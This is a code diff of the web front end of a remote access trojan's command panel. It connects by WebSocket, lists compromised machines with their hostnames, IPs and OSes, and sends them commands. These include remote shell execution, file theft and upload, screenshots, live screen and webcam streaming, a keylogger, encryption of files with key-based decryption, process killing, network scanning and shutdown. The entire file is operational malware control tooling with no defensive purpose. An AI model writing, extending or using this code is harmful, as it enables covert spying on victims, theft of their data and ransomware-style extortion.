+      console.log('Attempting WebSocket connection to:', wsUrl.replace(/token=[^&]+/, 'token=***'));
+      ws = new WebSocket(wsUrl);
+      
+      ws.onopen = function() {
+        updateConnectionStatus('connected');
+        showNotification('WebSocket connection established', 'success');
+        reconnectAttempts = 0;
+        
+        // Request client list immediately and repeatedly
+        setTimeout(() => requestClientList(), 100);
+        
+        // Set up periodic client list requests
+        setInterval(() => {
+          if (ws && ws.readyState === WebSocket.OPEN) {
+            console.log('Periodic client list request...');
+            requestClientList();
+          }
+        }, 3000);
+        
+        // Debug: Log that we're requesting client list
+        console.log('WebSocket opened, requesting client list...');
+      };
+      
+      ws.onmessage = function(event) {
+        try {
+          let data;
+          
+          // Handle both text and binary messages
+          if (typeof event.data === 'string') {
+            data = JSON.parse(event.data);
+          } else {
+            // Binary data (for images/streams)
+            handleBinaryData(event.data);
+            return;
+          }
+          
+          handleWebSocketMessage(data);
+        } catch (error) {
+          console.error('Error parsing WebSocket message:', error);
+          logOutput(`Fehler beim Verarbeiten der Nachricht: ${error.message}`, 'error');
+        }
+      };
+      
+      ws.onclose = function(event) {
+        updateConnectionStatus('disconnected');
+        console.log('WebSocket closed with code:', event.code, 'reason:', event.reason);
+        
+        if (event.code === 4401) {
+          // Unauthorized - token expired or invalid
+          localStorage.removeItem('rat_token');
+          showLogin();
+          showNotification('Session expired or invalid. Please log in again.', 'warning');
+        } else if (reconnectAttempts < maxReconnectAttempts) {
+          reconnectAttempts++;
+          showNotification(`Connection lost. Reconnecting in 3 seconds... (${reconnectAttempts}/${maxReconnectAttempts})`, 'warning');
+          setTimeout(connectWebSocket, 3000);
+        } else {
+          showNotification('Maximum reconnection attempts reached', 'error');
+        }
+      };
+      
+      ws.onerror = function(error) {
+        console.error('WebSocket Error:', error);
+        updateConnectionStatus('error');
+        showNotification('WebSocket Verbindungsfehler', 'error');
+      };
+    }
+
+    function handleWebSocketMessage(data) {
+      console.log('Received WebSocket message:', data); // Debug log
+      
+      switch (data.type) {
+        case 'client_list':
+          console.log('Updating client list with clients:', data.clients, lastClientList); // Debug log
+          console.log('Received client list message:', data); // Full debug log
+          updateClientList(data.clients || []);
+          break;
+          
+        case 'client_connected':
+          showNotification(`New client connected: ${data.client.hostname}`, 'success');
+          requestClientList(); // Auto-refresh client list
+          break;
+          
+        case 'client_disconnected':
+          showNotification(`Client disconnected: ${data.client_id}`, 'warning');
+          selectedClients.delete(data.client_id);
+          updateSelectedCount();
+          requestClientList(); // Auto-refresh client list
+          break;
+          
+        case 'command_output':
+          logOutput(`<pre>${data.output}</pre>`, 'info');
+          break;
+          
+        case 'screenshot':
+          displayScreenshot(data.data);
+          break;
+          
+        case 'screen_frame':
+          displayScreenFrame(data.data);
+          break;
+          
+        case 'webcam_frame':
+          displayWebcamFrame(data);
+          break;
+          
+        case 'file_download':
+          downloadFile(data.filename, data.data);
+          break;
+          
+        case 'error':
+          logOutput(`Fehler: ${data.message}`, 'error');
+          showNotification(data.message, 'error');
+          break;
+          
+        case 'debug':
+          if (data.level === 'error') {
+            logOutput(`Debug: ${data.msg}`, 'error');
+          } else {
+            logOutput(`Debug: ${data.msg}`, 'info');
+          }
+          break;
+          
+        case 'pong':
+          // Handle ping response
+          break;
+          
+        default:
+          console.log('Unhandled message type:', data.type, data);
+      }
+    }
+
+    function handleBinaryData(data) {
+      // Handle binary data for webcam frames or other binary content
+      const canvas = webcamCanvas;
+      const ctx = canvas.getContext('2d');
+      
+      // Convert binary data to image and display
+      const blob = new Blob([data], { type: 'image/jpeg' });
+      const url = URL.createObjectURL(blob);
+      const img = new Image();
+      
+      img.onload = function() {
+        canvas.width = img.width;
+        canvas.height = img.height;
+        ctx.drawImage(img, 0, 0);
+        URL.revokeObjectURL(url);
+        
+        // Show webcam container
+        webcamContainer.classList.remove('hidden');
+        mediaPlaceholder.classList.add('hidden');
+      };
+      
+      img.src = url;
+    }
+
+    // Client Management
+    function updateClientList(clients) {
+      clientList.innerHTML = '';
+      clientCount.textContent = clients.length;
+
+      lastClientList = clients;
+      
+      if (clients.length === 0) {
+        clientList.innerHTML = `
+          <div class="text-center text-gray-400 py-8">
+            <i class="fas fa-satellite-dish text-3xl mb-3"></i>
+            <p>No clients connected</p>
+            <p class="text-sm">Waiting for connections...</p>
           </div>
-          <div class="text-xs text-gray-400 mt-1 truncate">${client.ip}</div>`;
-        div.onclick = () => toggleClientSelection(client.id);
-        listEl.appendChild(div);
+        `;
+        return;
+      }
+      
+      clients.forEach(client => {
+        const clientElement = createClientElement(client);
+        clientList.appendChild(clientElement);
       });
+      
+      updateSelectedCount();
+    }
+
+    function createClientElement(client) {
+      const div = document.createElement('div');
+      div.className = 'client-card glass-effect p-4 rounded-lg cursor-pointer transition-all duration-300';
+
+      div.dataset.clientId = client.id;
+
+      
+      const osIcon = getOSIcon(client.os);
+      const isSelected = selectedClients.has(client.id);
+      
+      if (isSelected) {
+        div.classList.add('selected');
+      }
+      
+      div.innerHTML = `
+        <div style="overflow: hidden">
+        <div class="flex items-center justify-between mb-2">
+          <div class="flex items-center">
+            <div class="status-dot w-3 h-3 bg-green-400 rounded-full mr-3"></div>
+            <i class="${osIcon} text-lg mr-2"></i>
+            <span class="font-medium text-white">${client.hostname}</span>
+          </div>
+          <div class="flex items-center">
+            ${isSelected ? '<i class="fas fa-check-circle text-blue-400"></i>' : ''}
+          </div>
+        </div>
+        <div class="text-sm text-gray-300">
+          <div class="flex justify-between mb-1">
+            <span>IP:</span>
+            <span>${client.ip || (client.address ? client.address[0] : 'Unknown')}</span>
+          </div>
+          <div class="flex justify-between">
+            <span>OS:</span>
+            <span class="text-xs">${client.os || 'Unknown'}</span>
+          </div>
+        </div>
+        </div>
+      `;
+      
+      div.addEventListener('click', (e) => {
+        if (e.ctrlKey || e.metaKey) {
+          // Multi-select with Ctrl/Cmd
+          toggleClientSelection(client.id);
+        } else {
+          // Single select
+          selectedClients.clear();
+          toggleClientSelection(client.id);
+        }
+        updateClientList(Array.from(document.querySelectorAll('.client-card')).map(el => ({
+          id: el.dataset.clientId,
+          hostname: el.querySelector('.font-medium').textContent,
+          ip: el.querySelector('.text-gray-300 span:last-child').textContent,
+          os: client.os
+        })));
+      });
+      
+      return div;
+    }
+
+    function getOSIcon(os) {
+      if (!os) return 'fas fa-desktop';
+      const osLower = os.toLowerCase();
+      if (osLower.includes('windows')) return 'fab fa-windows';
+      if (osLower.includes('linux')) return 'fab fa-linux';
+      if (osLower.includes('mac') || osLower.includes('darwin')) return 'fab fa-apple';
+      return 'fas fa-desktop';
     }
 
     function toggleClientSelection(clientId) {
-      if (selectedClients.has(clientId)) selectedClients.delete(clientId);
-      else selectedClients.add(clientId);
-      $('selected-count').textContent = selectedClients.size;
-      ws.send(JSON.stringify({ action: 'get_clients' }));
+      if (selectedClients.has(clientId)) {
+        selectedClients.delete(clientId);
+      } else {
+        selectedClients.add(clientId);
+      }
+      updateSelectedCount();
+      updateClientVisuals();
+    }
+
+    function updateSelectedCount() {
+      selectedCount.textContent = selectedClients.size;
+    }
+
+    function updateClientVisuals() {
+      document.querySelectorAll('.client-card').forEach(card => {
+        const clientId = card.dataset.clientId;
+        const checkIcon = card.querySelector('.fa-check-circle');
+        
+        if (selectedClients.has(clientId)) {
+          card.classList.add('selected');
+          if (!checkIcon) {
+            const iconContainer = card.querySelector('.flex.items-center:last-child');
+            iconContainer.innerHTML = '<i class="fas fa-check-circle text-blue-400"></i>';
+          }
+        } else {
+          card.classList.remove('selected');
+          if (checkIcon) {
+            checkIcon.remove();
+          }
+        }
+      });
+    }
+
+    function requestClientList() {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        console.log('Requesting client list...'); // Debug log
+        ws.send(JSON.stringify({ action: 'get_clients' }));
+      } else {
+        console.log('WebSocket not ready, state:', ws ? ws.readyState : 'no websocket'); // Debug log
+      }
+    }
+
+    // Command Handling
+    function setupCommandInput() {
+      commandInput.addEventListener('input', handleCommandInput);
+      commandInput.addEventListener('keydown', handleCommandKeydown);
+      commandInput.addEventListener('focus', showCommandSuggestions);
+      commandInput.addEventListener('blur', hideCommandSuggestions);
+    }
+
+    function handleCommandInput() {
+      const value = commandInput.value;
+      if (value.startsWith('/')) {
+        showCommandSuggestions();
+      } else {
+        hideCommandSuggestions();
+      }
+    }
+
+    function handleCommandKeydown(e) {
+      switch (e.key) {
+        case 'Enter':
+          if (!e.shiftKey) {
+            e.preventDefault();
+            sendCommandToClients();
+          }
+          break;
+        case 'ArrowUp':
+          navigateHistory(-1);
+          e.preventDefault();
+          break;
+        case 'ArrowDown':
+          navigateHistory(1);
+          e.preventDefault();
+          break;
+        case 'Tab':
+          e.preventDefault();
+          autocompleteCommand();
+          break;
+      }
+    }
+
+    function showCommandSuggestions() {
+      const value = commandInput.value.toLowerCase();
+      if (!value.startsWith('/')) {
+        hideCommandSuggestions();
+        return;
+      }
+      
+      // Enhanced filtering with categories - inspired by CommandInput.tsx
+      const filtered = commands.filter(cmd => 
+        cmd.cmd.toLowerCase().includes(value) || 
+        cmd.desc.toLowerCase().includes(value)
+      ).sort((a, b) => {
+        // Prioritize exact matches
+        const aExact = a.cmd.toLowerCase().startsWith(value);
+        const bExact = b.cmd.toLowerCase().startsWith(value);
+        if (aExact && !bExact) return -1;
+        if (!aExact && bExact) return 1;
+        return a.cmd.localeCompare(b.cmd);
+      });
+      
+      if (filtered.length === 0) {
+        hideCommandSuggestions();
+        return;
+      }
+      
+      // Category colors mapping (like in CommandInput.tsx)
+      const getCategoryColor = (cmdName) => {
+        const categoryMap = {
+          '/help': '#6b7280', '/exec': '#ef4444', '/screenshot': '#8b5cf6',
+          '/download': '#10b981', '/upload': '#10b981', '/ls': '#10b981', '/cd': '#10b981',
+          '/systeminfo': '#3b82f6', '/history': '#3b82f6', '/keylogger': '#f59e0b',
+          '/encrypt': '#f97316', '/decrypt': '#f97316', '/process_list': '#ef4444',
+          '/kill_process': '#ef4444', '/network_info': '#06b6d4', '/network_scan': '#06b6d4',
+          '/scan_cameras': '#06b6d4', '/screenstream_start': '#8b5cf6', '/screenstream_stop': '#8b5cf6',
+          '/webcam_start': '#8b5cf6', '/webcam_stop': '#8b5cf6',
+          '/shutdown': '#dc2626', '/restart': '#dc2626'
+        };
+        return categoryMap[cmdName] || '#6b7280';
+      };
+      
+      commandSuggestions.innerHTML = '';
+      filtered.forEach((cmd, index) => {
+        const div = document.createElement('div');
+        div.className = 'suggestion-item px-4 py-2 cursor-pointer flex items-center';
+        
+        // Enhanced suggestion with category indicator (inspired by CommandInput.tsx)
+        div.innerHTML = `
+          <div style="display: flex; align-items: center; flex: 1;">
+            <span style="
+              background-color: ${getCategoryColor(cmd.cmd)};
+              color: white;
+              font-size: 0.7em;
+              padding: 2px 6px;
+              border-radius: 3px;
+              margin-right: 8px;
+              text-transform: uppercase;
+              font-weight: bold;
+            ">
+              ${cmd.cmd.includes('process') ? 'SYS' : 
+                cmd.cmd.includes('network') || cmd.cmd.includes('scan') ? 'NET' :
+                cmd.cmd.includes('stream') || cmd.cmd.includes('webcam') || cmd.cmd.includes('screenshot') ? 'MED' :
+                cmd.cmd.includes('download') || cmd.cmd.includes('upload') || cmd.cmd.includes('ls') || cmd.cmd.includes('cd') ? 'FILE' :
+                cmd.cmd.includes('encrypt') || cmd.cmd.includes('decrypt') ? 'SEC' :
+                cmd.cmd.includes('shutdown') || cmd.cmd.includes('restart') ? 'PWR' :
+                cmd.cmd.includes('keylogger') ? 'SPY' :
+                cmd.cmd.includes('info') || cmd.cmd.includes('history') ? 'INFO' : 'GEN'}
+            </span>
+            <span class="font-medium text-blue-400" style="min-width: 110px;">${cmd.cmd}</span>
+            <span class="text-sm text-gray-400" style="margin-left: 10px;">${cmd.desc}</span>
+          </div>
+        `;
+        
+        div.addEventListener('click', () => {
+          commandInput.value = cmd.cmd + ' ';
+          commandInput.focus();
+          hideCommandSuggestions();
+        });
+        
+        commandSuggestions.appendChild(div);
+      });
+      
+      commandSuggestions.classList.remove('hidden');
+    }
+
+    function hideCommandSuggestions() {
+      setTimeout(() => {
+        commandSuggestions.classList.add('hidden');
+      }, 150);
+    }
+
+    function autocompleteCommand() {
+      const value = commandInput.value.toLowerCase();
+      const matches = commands.filter(cmd => cmd.cmd.toLowerCase().startsWith(value));
+      
+      if (matches.length === 1) {
+        commandInput.value = matches[0].cmd + ' ';
+      }
+    }
+
+    function navigateHistory(direction) {
+      if (commandHistory.length === 0) return;
+      
+      historyIndex += direction;
+      historyIndex = Math.max(-1, Math.min(historyIndex, commandHistory.length - 1));
+      
+      if (historyIndex === -1) {
+        commandInput.value = '';
+      } else {
+        commandInput.value = commandHistory[historyIndex];
+      }
     }
 
     function sendCommandToClients() {
-      const command = $('command-input').value.trim();
-      if (!command || selectedClients.size === 0) return showNotification('Client und Befehl auswählen', 'error');
-      
-      const parts = command.split(' ');
-      const payload = { action: parts[0].substring(1), target_ids: Array.from(selectedClients) };
-      const args = parts.slice(1).join(' ');
-      if (args) {
-        if (payload.action === 'exec') payload.command = args;
-        else if (['download', 'ls', 'cd'].includes(payload.action)) payload.path = args;
-        else payload.argument = args;
+      const command = commandInput.value.trim();
+      if (!command || selectedClients.size === 0) {
+        showNotification('Please select a client and enter a command', 'warning');
+        return;
       }
-      ws.send(JSON.stringify(payload));
-      logOutput(command, 'command');
-      $('command-input').value = '';
-    }
-
-    function displayMedia(type, base64Data) {
-        $('media-placeholder').classList.add('hidden');
-        const screenshotImg = $('screenshot-img');
-        const screenCanvas = $('screen-canvas');
-        const stopBtn = $('stop-stream-btn');
-
-        if (type === 'screenshot') {
-            screenshotImg.src = `data:image/jpeg;base64,${base64Data}`;
-            screenshotImg.classList.remove('hidden');
-            screenCanvas.classList.add('hidden');
-            stopBtn.classList.add('hidden');
-        } else { // screen_frame
-            const img = new Image();
-            img.src = `data:image/jpeg;base64,${base64Data}`;
-            img.onload = () => {
-                screenCanvas.width = img.width;
-                screenCanvas.height = img.height;
-                screenCanvas.getContext('2d').drawImage(img, 0, 0);
-            };
-            screenshotImg.classList.add('hidden');
-            screenCanvas.classList.remove('hidden');
-            stopBtn.classList.remove('hidden');
+      
+      // Add to history
+      if (commandHistory[commandHistory.length - 1] !== command) {
+        commandHistory.push(command);
+        if (commandHistory.length > 100) {
+          commandHistory.shift();
         }
-    }
-
-    function stopStream() {
-        $('command-input').value = '/screenstream_stop';
-        sendCommandToClients();
-        $('screen-canvas').classList.add('hidden');
-        $('stop-stream-btn').classList.add('hidden');
-        $('media-placeholder').classList.remove('hidden');
-    }
-
-    document.addEventListener('DOMContentLoaded', () => {
-      $('login-form').onsubmit = (e) => { e.preventDefault(); login($('login-username').value, $('login-password').value); };
-      $('menu-toggle').onclick = toggleSidebar;
-      $('send-command').onclick = sendCommandToClients;
-      $('command-input').onkeydown = (e) => e.key === 'Enter' && sendCommandToClients();
-      $('refresh-clients').onclick = () => ws.send(JSON.stringify({ action: 'get_clients' }));
-      $('select-all-clients').onclick = () => {
-        document.querySelectorAll('.client-card').forEach(c => selectedClients.add(c.dataset.clientId));
-        toggleClientSelection();
+      }
+      historyIndex = -1;
+      
+      // Parse and send command
+      const parsedCommand = parseCommand(command);
+      const payload = {
+        ...parsedCommand,
+        target_ids: Array.from(selectedClients)
       };
-      $('clear-output').onclick = () => { $('output-area').innerHTML = '<p class="text-gray-500 text-center py-8">Bereit für Befehle...</p>'; };
-      $('stop-stream-btn').onclick = stopStream;
+
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify(payload));
+      }
+      
+      logOutput(`Command sent to ${selectedClients.size} client(s): ${command}`, 'command');
+      commandInput.value = '';
+      hideCommandSuggestions();
+    }
+
+    function parseCommand(command) {
+      const parts = command.trim().split(' ');
+      const action = parts[0].startsWith('/') ? parts[0].substring(1) : parts[0];
+      const args = parts.slice(1).join(' ');
+      
+      const result = { action };
+      
+      switch (action) {
+        case 'exec':
+          result.command = args;
+          break;
+        case 'download':
+          result.path = args;
+          break;
+        case 'upload':
+          result.filename = args;
+          break;
+        case 'ls':
+          result.path = args || '.';
+          break;
+        case 'cd':
+          result.path = args || '.';
+          break;
+        case 'history':
+          result.limit = parseInt(args) || 50;
+          break;
+        case 'keylogger':
+          result.count = parseInt(args) || 100;
+          break;
+        case 'encrypt':
+        case 'decrypt':
+          const pathAndKey = args.split(' ');
+          result.path = pathAndKey[0] || '.';
+          if (action === 'decrypt' && pathAndKey[1]) {
+            result.key_hex = pathAndKey[1];
+          }
+          break;
+        case 'kill_process':
+          result.pid = args;
+          break;
+        case 'network_scan':
+          result.range = args || '192.168.1.0/24';
+          break;
+        default:
+          if (args) {
+            result.argument = args;
+          }
+      }
+      
+      return result;
+    }
+
+    // Server Stats Functions
+    async function loadServerStats() {
+      try {
+        const token = localStorage.getItem('rat_token');
+        if (!token) {
+          throw new Error('No authentication token available');
+        }
+        
+        const response = await fetch('/api/stats', {
+          headers: {
+            'Authorization': `Bearer ${token}`
+          }
+        });
+        
+        if (response.ok) {
+          const stats = await response.json();
+          displayServerStats(stats);
+        } else if (response.status === 401) {
+          // Token expired, try fallback or redirect to login
+          console.log('JWT token invalid, redirecting to login');
+          localStorage.removeItem('rat_token');
+          showLogin();
+          throw new Error('Authentication failed');
+        } else {
+          throw new Error('Failed to load stats');
+        }
+      } catch (error) {
+        if (error.message !== 'Authentication failed') {
+          showNotification('Error loading server statistics', 'error');
+        }
+        console.error('Stats error:', error);
+      }
+    }
+
+    function displayServerStats(stats) {
+      const createStatCard = (title, value, icon, color = 'bg-gray-700') => {
+        return `
+          <div class="${color} rounded-lg p-4">
+            <div class="flex items-center justify-between">
+              <div>
+                <p class="text-gray-300 text-sm">${title}</p>
+                <p class="text-2xl font-bold text-white">${value}</p>
+              </div>
+              <i class="${icon} text-3xl text-gray-400"></i>
+            </div>
+          </div>
+        `;
+      };
+
+      const formatUptime = (seconds) => {
+        const hours = Math.floor(seconds / 3600);
+        const minutes = Math.floor((seconds % 3600) / 60);
+        return `${hours}h ${minutes}m`;
+      };
+
+      serverStatsContent.innerHTML = `
+        ${createStatCard('Connected Clients', stats.connected_clients || 0, 'fas fa-desktop', 'bg-blue-700')}
+        ${createStatCard('Web UI Connections', stats.web_ui_connections || 0, 'fas fa-globe', 'bg-green-700')}
+        ${createStatCard('Banned IPs', stats.banned_ips || 0, 'fas fa-ban', 'bg-red-700')}
+        ${createStatCard('CPU Usage', `${stats.cpu_percent || 0}%`, 'fas fa-microchip')}
+        ${createStatCard('RAM Usage', `${stats.memory_percent || 0}%`, 'fas fa-memory')}
+        ${createStatCard('Disk Usage', `${stats.disk_percent || 0}%`, 'fas fa-hdd')}
+        ${createStatCard('RAM', `${stats.memory_used_gb || 0} / ${stats.memory_total_gb || 0} GB`, 'fas fa-memory')}
+        ${createStatCard('Disk Space', `${stats.disk_used_gb || 0} / ${stats.disk_total_gb || 0} GB`, 'fas fa-hdd')}
+        ${createStatCard('Server Uptime', formatUptime(stats.uptime || 0), 'fas fa-clock', 'bg-purple-700')}
+      `;
+    }
+
+    // Media Handling
+    function displayScreenshot(base64Data) {
+      screenshotImg.src = `data:image/png;base64,${base64Data}`;
+      screenshotContainer.classList.remove('hidden');
+      mediaPlaceholder.classList.add('hidden');
+      
+      showNotification('Screenshot received', 'success');
+    }
+
+    function displayScreenFrame(base64Data) {
+      if (!screenCanvas) return;
+      
+      const ctx = screenCanvas.getContext('2d');
+      const img = new Image();
+      
+      img.onload = function() {
+        screenCanvas.width = img.width;
+        screenCanvas.height = img.height;
+        ctx.drawImage(img, 0, 0);
+      };
+      img.src = `data:image/jpeg;base64,${base64Data}`;
+      
+      screenStreamContainer.classList.remove('hidden');
+      mediaPlaceholder.classList.add('hidden');
+      screenStatus.textContent = `Stream aktiv`;
+    }
+
+    function displayWebcamFrame(data) {
+      webcamContainer.classList.remove('hidden');
+      mediaPlaceholder.classList.add('hidden');
+      webcamStatus.textContent = 'Webcam Stream aktiv';
+    }
+
+    function downloadFile(filename, base64Data) {
+      const byteCharacters = atob(base64Data);
+      const byteNumbers = new Array(byteCharacters.length);
+      for (let i = 0; i < byteCharacters.length; i++) {
+        byteNumbers[i] = byteCharacters.charCodeAt(i);
+      }
+      const byteArray = new Uint8Array(byteNumbers);
+      const blob = new Blob([byteArray]);
+      
+      const url = window.URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      window.URL.revokeObjectURL(url);
+      
+      showNotification(`Datei heruntergeladen: ${filename}`, 'success');
+    }
+
+    // File Upload
+    function setupFileUpload() {
+      uploadBtn.addEventListener('click', () => fileUpload.click());
+      fileUpload.addEventListener('change', handleFileUpload);
+    }
+
+    function handleFileUpload(event) {
+      const files = Array.from(event.target.files);
+      if (files.length === 0 || selectedClients.size === 0) return;
+      
+      files.forEach(file => {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+          const base64Data = e.target.result.split(',')[1];
+          
+          selectedClients.forEach(clientId => {
+            const payload = {
+              action: 'upload',
+              target_id: clientId,
+              filename: file.name,
+              data: base64Data
+            };
+            
+            if (ws && ws.readyState === WebSocket.OPEN) {
+              ws.send(JSON.stringify(payload));
+            }
+          });
+          
+          showNotification(`Datei hochgeladen: ${file.name}`, 'success');
+        };
+        reader.readAsDataURL(file);
+      });
+      
+      event.target.value = ''; // Reset file input
+    }
+
+    // Event Listeners
+    function setupEventListeners() {
+      // Login form
+      loginForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const username = document.getElementById('login-username').value;
+        const password = document.getElementById('login-password').value;
+        await login(username, password);
+      });
+      
+      // Send command
+      sendCommand.addEventListener('click', sendCommandToClients);
+      
+      // Quick actions
       document.querySelectorAll('.quick-action').forEach(btn => {
-        btn.onclick = () => { $('command-input').value = btn.dataset.command; $('command-input').focus(); };
+        btn.addEventListener('click', () => {
+          commandInput.value = btn.dataset.command;
+          commandInput.focus();
+        });
+      });
+      
+      // Control buttons
+      document.getElementById('refresh-clients').addEventListener('click', requestClientList);
+      
+      document.getElementById('select-all-clients').addEventListener('click', () => {
+        const allClientIds = Array.from(document.querySelectorAll('.client-card'))
+          .map(card => card.dataset.clientId);
+        selectedClients.clear();
+        allClientIds.forEach(id => selectedClients.add(id));
+        updateSelectedCount();
+        updateClientVisuals();
+      });
+      
+      document.getElementById('clear-output').addEventListener('click', () => {
+        outputArea.innerHTML = `
+          <div class="text-gray-400 text-center py-8">
+            <i class="fas fa-terminal text-3xl mb-3"></i>
+            <p>Ready for commands...</p>
+            <p class="text-xs mt-2">Use / for command suggestions</p>
+          </div>
+        `;
+      });
+      
+      document.getElementById('copy-output').addEventListener('click', () => {
+        const text = outputArea.innerText;
+        navigator.clipboard.writeText(text).then(() => {
+          showNotification('Output copied to clipboard', 'success');
+        });
+      });
+      
+      document.getElementById('export-logs').addEventListener('click', () => {
+        const text = outputArea.innerText;
+        const blob = new Blob([text], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `rat-logs-${new Date().toISOString().slice(0, 19)}.txt`;
+        a.click();
+        URL.revokeObjectURL(url);
+        showNotification('Logs exported', 'success');
       });
 
-      if (localStorage.getItem('rat_token')) {
+      // Server stats modal
+      serverStatsBtn.addEventListener('click', () => {
+        serverStatsModal.classList.remove('hidden');
+        loadServerStats();
+      });
+      
+      closeStatsModal.addEventListener('click', () => {
+        serverStatsModal.classList.add('hidden');
+      });
+      
+      refreshStats.addEventListener('click', loadServerStats);
+      
+      // Media controls
+      document.getElementById('stop-screen-stream').addEventListener('click', () => {
+        commandInput.value = '/screenstream_stop';
+        sendCommandToClients();
+        screenStreamContainer.classList.add('hidden');
+        if (mediaPlaceholder && !webcamContainer.classList.contains('hidden') && !screenshotContainer.classList.contains('hidden')) {
+          mediaPlaceholder.classList.remove('hidden');
+        }
+      });
+      
+      document.getElementById('stop-webcam').addEventListener('click', () => {
+        commandInput.value = '/webcam_stop';
+        sendCommandToClients();
+        webcamContainer.classList.add('hidden');
+        if (mediaPlaceholder && !screenStreamContainer.classList.contains('hidden') && !screenshotContainer.classList.contains('hidden')) {
+          mediaPlaceholder.classList.remove('hidden');
+        }
+      });
+      
+      document.getElementById('download-screenshot').addEventListener('click', () => {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const img = screenshotImg;
+        
+        canvas.width = img.naturalWidth;
+        canvas.height = img.naturalHeight;
+        ctx.drawImage(img, 0, 0);
+        
+        canvas.toBlob(blob => {
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = `screenshot-${new Date().toISOString().slice(0, 19)}.png`;
+          a.click();
+          URL.revokeObjectURL(url);
+        });
+      });
+      
+      setupCommandInput();
+      setupFileUpload();
+    }
+
+    function showLogin() {
+      loginOverlay.classList.remove('hidden');
+      mainApp.classList.add('hidden');
+      isAuthenticated = false;
+    }
+
+    // Initialize Application
+    function init() {
+      setupEventListeners();
+      
+      // Check for existing token
+      const token = localStorage.getItem('rat_token');
+      if (token) {
+        loginOverlay.classList.add('hidden');
+        mainApp.classList.remove('hidden');
         isAuthenticated = true;
-        $('login-overlay').classList.add('hidden');
-        $('main-app').classList.remove('hidden');
         connectWebSocket();
       }
-    });
+      
+      // Auto-refresh client list every 30 seconds
+      setInterval(() => {
+        if (isAuthenticated && ws && ws.readyState === WebSocket.OPEN) {
+          requestClientList();
+        }
+      }, 30000);
+    }
+
+    // Start the application
+    init();
   </script>
+
+
+
 </body>
 </html>
